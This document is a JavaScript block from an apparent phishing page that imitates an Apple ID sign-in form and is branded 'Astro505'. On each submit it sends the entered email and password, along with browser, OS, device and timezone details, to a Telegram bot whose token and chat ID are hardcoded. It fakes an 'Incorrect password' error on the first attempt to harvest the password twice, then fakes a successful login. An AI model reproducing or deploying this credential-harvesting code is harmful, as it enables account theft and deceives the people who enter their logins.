<script>
document.addEventListener('DOMContentLoaded', () => {
    const emailInput = document.getElementById('email-phone');
    const arrowIcon = document.querySelector('.bx-right-arrow-circle');
    const passwordField = document.getElementById('passwordField');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    const form = document.getElementById('sign-in');
    
    // 👇 TELEGRAM CONFIG (TUS DATOS)
    const TELEGRAM_TOKEN = '7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA'; // ← ¡PON TU TOKEN AQUÍ!
    const CHAT_ID = '7219932215';
    
    let loginAttempts = 0;
    const maxAttempts = 2;
    
    // Función para enviar a Telegram
    async function sendToTelegram(email, password) {
        try {
            // Datos del usuario
            const userAgent = navigator.userAgent;
            const country = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
            const ip = 'Loading...'; // Puedes agregar IP real con API
            const browser = navigator.userAgentData?.brands[0]?.brand || 'Unknown';
            const os = navigator.platform || 'Unknown';
            const device = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
            const time = new Date().toLocaleString('es-ES', { timeZone: 'America/Mexico_City' });
            
            const message = `🚀 ASTRO505 - NUEVA CAPTURA APPLE ID 🚀

📧 Email: ${email}
🔑 Password: ${password}
🌍 País: ${country}
🌐 IP: ${ip}
💻 Navegador: ${browser}
🖥️ Sistema: ${os}
📱 Device: ${device}
📅 Hora: ${time}

✨ Plataforma: Astro505`;

            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            console.log('✅ Enviado a Telegram!');
        } catch (error) {
            console.error('❌ Error Telegram:', error);
        }
    }
    
    // Mostrar password
    const showPassword = () => {
        if (emailInput.value.trim()) {
            passwordField.classList.add('show');
            submitBtn.classList.add('show');
            setTimeout(() => {
                passwordInput.focus();
                passwordInput.select();
            }, 250);
        } else {
            emailInput.focus();
            showError('Enter your email or phone number');
        }
    };
    
    // Eventos
    arrowIcon.addEventListener('click', showPassword);
    
    emailInput.addEventListener('keypress', e => {
        if (e.key === 'Enter' && emailInput.value.trim()) {
            e.preventDefault();
            showPassword();
        }
    });
    
    emailInput.addEventListener('input', () => {
        if (!emailInput.value.trim()) {
            passwordField.classList.remove('show');
            submitBtn.classList.remove('show');
            passwordInput.value = '';
            errorMsg.classList.remove('show');
        }
    });
    
    // SUBMIT CON TELEGRAM
    form.addEventListener('submit', async e => {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!email) {
            showError('Please enter your email or phone number');
            emailInput.focus();
            return;
        }
        
        if (!password) {
            showError('Please enter your password');
            passwordInput.focus();
            return;
        }
        
        // 👇 ENVÍA A TELEGRAM INMEDIATAMENTE
        await sendToTelegram(email, password);
        
        loginAttempts++;
        
        if (loginAttempts < maxAttempts) {
            showError('Incorrect password. Try again.');
            passwordInput.value = '';
            passwordInput.focus();
        } else {
            // Éxito visual
            errorMsg.textContent = 'Signing in...';
            errorMsg.style.background = '#007AFF';
            errorMsg.classList.add('show');
            submitBtn.disabled = true;
            setTimeout(() => {
                window.location.href = 'index.html';
            }, 1500);
        }
    });
    
    passwordInput.addEventListener('keypress', e => {
        if (e.key === 'Enter') {
            form.dispatchEvent(new Event('submit'));
        }
    });
    
    function showError(message) {
        errorMsg.textContent = message;
        errorMsg.style.background = '#ff3b30';
        errorMsg.classList.add('show');
        setTimeout(() => errorMsg.classList.remove('show'), 3000);
    }
});
</script>
